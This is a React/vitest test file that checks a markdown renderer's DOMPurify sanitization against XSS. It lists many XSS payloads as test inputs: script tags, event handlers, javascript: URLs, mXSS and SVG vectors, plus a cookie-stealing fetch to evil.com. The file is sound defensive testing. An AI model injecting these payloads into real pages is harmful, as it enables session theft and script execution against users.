import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import DOMPurify from 'dompurify';
import { marked } from 'marked';

// Test component that mimics InteractionPanel's renderMessage function
const RenderMessage = ({ content, isMarkdown = false }: { content: string; isMarkdown?: boolean }) => {
  if (isMarkdown) {
    marked.setOptions({
      breaks: true,
      gfm: true,
      headerIds: false,
      mangle: false
    });

    const rawHtml = marked(content) as string;
    const sanitizedHtml = DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'code', 'pre', 'a', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
      ALLOW_DATA_ATTR: false
    });

    return <div data-testid="rendered-content" dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
  }
  return <div data-testid="rendered-content">{content}</div>;
};

describe('XSS Sanitization - Security Tests', () => {
  describe('Script Injection Prevention', () => {
    it('should remove inline script tags', () => {
      const maliciousContent = 'Hello <script>alert("XSS")</script> World';
      const { container } = render(<RenderMessage content={maliciousContent} isMarkdown={true} />);

      const html = container.innerHTML;
      expect(html).not.toContain('<script>');
      expect(html).not.toContain('alert');
      expect(html).toContain('Hello');
      expect(html).toContain('World');
    });

    it('should remove script tags with various encodings', () => {
      const attacks = [
        '<script>alert(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        expect(html.toLowerCase()).not.toContain('<script');
        expect(html).not.toContain('alert');
        expect(html).not.toContain('fetch');
      }
    });

    it('should remove event handler attributes', () => {
      const attacks = [
        '<img src="x" onerror="alert(1)">',
        '<div onclick="alert(1)">Click me</div>',
        '<a href="#" onmouseover="alert(1)">Hover</a>',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)">',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        expect(html).not.toContain('onerror');
        expect(html).not.toContain('onclick');
        expect(html).not.toContain('onmouseover');
        expect(html).not.toContain('onload');
        expect(html).not.toContain('onfocus');
        expect(html).not.toContain('alert');
      }
    });
  });

  describe('JavaScript URL Prevention', () => {
    it('should remove javascript: URLs from links', () => {
      const attacks = [
        '[Click me](javascript:alert(1))',
        '[XSS](javascript:void(document.cookie))',
        '<a href="javascript:alert(1)">Link</a>',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        expect(html).not.toContain('javascript:');
        expect(html).not.toContain('alert');
      }
    });

    it('should remove data: URLs with scripts', () => {
      const attack = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('data:text/html');
      expect(html).not.toContain('<script>');
    });

    it('should remove vbscript: URLs', () => {
      const attack = '<a href="vbscript:msgbox(1)">Click</a>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('vbscript:');
    });
  });

  describe('HTML Injection Prevention', () => {
    it('should remove iframe tags', () => {
      const attack = '<iframe src="http://evil.com"></iframe>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('<iframe');
    });

    it('should remove object and embed tags', () => {
      const attacks = [
        '<object data="evil.swf"></object>',
        '<embed src="evil.swf">',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        expect(html).not.toContain('<object');
        expect(html).not.toContain('<embed');
      }
    });

    it('should remove form tags', () => {
      const attack = '<form action="http://evil.com"><input name="password"></form>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('<form');
      expect(html).not.toContain('action');
    });

    it('should remove style tags with malicious CSS', () => {
      const attack = '<style>body { background: url("javascript:alert(1)") }</style>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('<style');
      expect(html).not.toContain('javascript:');
    });
  });

  describe('Attribute Injection Prevention', () => {
    it('should remove data attributes', () => {
      const attack = '<div data-custom="malicious">Content</div>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('data-custom');
    });

    it('should only allow safe attributes on links', () => {
      const content = '[Safe Link](https://example.com)';
      const { container } = render(<RenderMessage content={content} isMarkdown={true} />);
      const html = container.innerHTML;

      // Should have href attribute
      expect(html).toContain('href');
      expect(html).toContain('example.com');

      // Verify only allowed attributes are present
      const link = container.querySelector('a');
      if (link) {
        const attrs = Array.from(link.attributes).map(attr => attr.name);
        for (const attr of attrs) {
          expect(['href', 'target', 'rel']).toContain(attr);
        }
      }
    });
  });

  describe('Markdown Rendering with Safe Tags', () => {
    it('should allow safe markdown formatting', () => {
      const safeContent = `
# Heading 1
## Heading 2

**Bold text** and *italic text*

- List item 1
- List item 2

\`code snippet\`

> Blockquote

[Safe link](https://example.com)
      `;

      const { container } = render(<RenderMessage content={safeContent} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).toContain('<h1');
      expect(html).toContain('<h2');
      expect(html).toContain('<strong>');
      expect(html).toContain('<em>');
      expect(html).toContain('<ul>');
      expect(html).toContain('<li>');
      expect(html).toContain('<code>');
      expect(html).toContain('<blockquote>');
      expect(html).toContain('<a');
      expect(html).toContain('href="https://example.com"');
    });

    it('should preserve text content while sanitizing tags', () => {
      const content = 'Safe text <script>alert(1)</script> more safe text';
      const { container } = render(<RenderMessage content={content} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).toContain('Safe text');
      expect(html).toContain('more safe text');
      expect(html).not.toContain('<script');
      expect(html).not.toContain('alert');
    });
  });

  describe('Complex Attack Vectors', () => {
    it('should prevent DOM clobbering', () => {
      const attack = '<form name="getElementById"><input name="cookie"></form>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('<form');
      expect(html).not.toContain('name="getElementById"');
    });

    it('should prevent mutation XSS (mXSS)', () => {
      const attacks = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<svg><style><img src=x onerror=alert(1)></style></svg>',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        expect(html).not.toContain('onerror');
        expect(html).not.toContain('alert');
      }
    });

    it('should prevent HTML entity encoding attacks', () => {
      const attacks = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        // Entities should be decoded and then sanitized
        expect(html).not.toContain('alert');
      }
    });

    it('should prevent CSS expression injection', () => {
      const attack = '<div style="background:expression(alert(1))">Content</div>';
      const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
      const html = container.innerHTML;

      expect(html).not.toContain('expression');
      expect(html).not.toContain('alert');
    });

    it('should prevent SVG-based XSS', () => {
      const attacks = [
        '<svg onload="alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin="alert(1)">',
      ];

      for (const attack of attacks) {
        const { container } = render(<RenderMessage content={attack} isMarkdown={true} />);
        const html = container.innerHTML;

        expect(html).not.toContain('onload');
        expect(html).not.toContain('onbegin');
        expect(html).not.toContain('alert');
      }
    });
  });

  describe('Plain Text Mode', () => {
    it('should escape HTML in plain text mode', () => {
      const content = '<script>alert("XSS")</script>';
      render(<RenderMessage content={content} isMarkdown={false} />);

      const element = screen.getByTestId('rendered-content');

      // In plain text mode, HTML should be displayed as text, not executed
      expect(element.textContent).toBe(content);
      expect(element.innerHTML).not.toContain('<script>');
    });

    it('should handle special characters in plain text mode', () => {
      const content = '< > & " \' / \\';
      render(<RenderMessage content={content} isMarkdown={false} />);

      const element = screen.getByTestId('rendered-content');
      expect(element.textContent).toBe(content);
    });
  });

  describe('DOMPurify Configuration', () => {
    it('should not allow data attributes', () => {
      const content = '<p data-track="user">Content</p>';
      const sanitized = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['p'],
        ALLOW_DATA_ATTR: false
      });

      expect(sanitized).not.toContain('data-track');
    });

    it('should restrict to allowed tags only', () => {
      const content = '<div><p>Allowed</p><marquee>Not allowed</marquee></div>';
      const sanitized = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['p', 'strong', 'em'],
        ALLOW_DATA_ATTR: false
      });

      expect(sanitized).toContain('<p>');
      expect(sanitized).not.toContain('<div>');
      expect(sanitized).not.toContain('<marquee>');
    });

    it('should restrict to allowed attributes only', () => {
      const content = '<a href="https://example.com" onclick="alert(1)" class="link">Link</a>';
      const sanitized = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['a'],
        ALLOWED_ATTR: ['href', 'target', 'rel'],
        ALLOW_DATA_ATTR: false
      });

      expect(sanitized).toContain('href');
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('class');
    });
  });
});
